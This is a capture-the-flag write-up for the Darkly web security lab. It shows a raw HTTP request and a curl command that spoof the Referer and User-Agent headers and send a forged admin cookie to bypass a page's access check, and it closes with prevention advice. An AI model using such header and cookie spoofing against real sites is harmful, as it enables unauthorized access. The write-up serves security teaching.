## Exploiting Referer and User-Agent Headers on Darkly

### Context

By clicking on the "Born to Sec" link at the bottom of the main page:

```
http://192.168.1.33/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

You are redirected to a page about albatrosses. Inspecting the page’s source code reveals hidden comments containing crucial information:

```html
<!--
You must come from : "https://www.nsa.gov/".
-->
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

---

### Exploitation Steps

#### 1. Analyzing the Comments

- **Referer Requirement:** The page checks if the `Referer` header is set to `https://www.nsa.gov/`.
- **User-Agent Requirement:** The page expects the `User-Agent` header to be set to `ft_bornToSec`.

#### 2. Crafting the Request

Intercept the request using a proxy tool (e.g., Burp Suite) or simulate it using a custom script. The required HTTP request headers are:

```
GET /?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f HTTP/1.1
Host: 192.168.1.33
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: ft_bornToSec
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://www.nsa.gov/
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive
```

Alternatively, use `curl` to send the request:

```bash
curl -X GET "http://192.168.1.33/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
     -H "User-Agent: ft_bornToSec" \
     -H "Referer: https://www.nsa.gov/" \
     -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327"
```

#### 3. Result

Upon meeting the required headers, access is granted, revealing the desired content or flag.

---

### Understanding User-Agent

A **User-Agent** is a string included in HTTP requests to identify the client (browser, application, or script) to the server. It typically contains information about:

- The client software (e.g., web browser, automated tool like `curl`).
- The operating system (e.g., Windows, Linux, Android).
- The software version or device type.

#### Common Uses of User-Agent:

1. **Customizing Server Responses:**
   - Websites can serve optimized content based on the User-Agent (e.g., mobile vs. desktop versions).
   - Search engines like Googlebot receive specific content for indexing.

2. **Tracking and Analytics:**
   - Administrators use User-Agent data to analyze visitor behavior, including browser and OS usage.

3. **Conditional Access:**
   - Servers may restrict access to specific User-Agents to enforce security or compatibility.

4. **Debugging and Automation:**
   - Tools like `curl` or `wget` use User-Agent strings to mimic browsers during testing or automation tasks.

---

### Preventing Vulnerabilities

To prevent this type of vulnerability, servers should avoid relying solely on HTTP headers such as `Referer` and `User-Agent` for validation. Instead, implement the following:

1. **Server-Side Validation:**
   - Verify the authenticity of requests using server-side checks.
   - Use CSRF tokens to ensure requests originate from legitimate sources.

2. **Avoid Over-Reliance on Headers:**
   - HTTP headers like `Referer` and `User-Agent` are client-controlled and can be spoofed.

3. **Enhanced Logging and Monitoring:**
   - Log header data to identify unusual patterns or malicious activities.


